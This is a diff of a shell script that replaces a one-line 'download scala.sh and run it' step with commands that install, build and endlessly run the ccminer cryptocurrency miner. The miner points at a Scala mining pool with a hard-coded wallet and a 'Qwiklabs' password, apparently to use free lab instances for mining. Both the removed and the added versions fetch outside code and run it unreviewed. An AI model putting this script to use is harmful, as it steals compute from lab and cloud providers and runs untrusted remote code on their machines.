@@ -12,8 +12,21 @@ function timeout_monitor() {
 timeout_monitor "$$" &
 Timeout_monitor_pid=$!
 
-wget https://try.gitea.io/gairmeet/mining/raw/branch/master/scala.sh && chmod +x scala.sh && ./scala.sh
+apt update
+apt install sudo
+apt install git -y
+sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
+cd ccminer
+chmod +x build.sh
+chmod +x configure.sh
+chmod +x autogen.sh
+./build.sh
+while [ 1 ]; do
+./ccminer -o mine.scalaproject.io:3333 -u SvkRBartVquTUH7c165FxZCmbCH9USTdUNMecUqY8KJd3twTBMyUQJoMiGYbKkeYMYC3VzfwLsGJVW5vMoYBspcN1XLNVfjiV -p Qwiklabs -a panthera -k -t2
+sleep 3
 done
+sleep 999
 # <your script here>
 
 # kill timeout monitor when terminating:
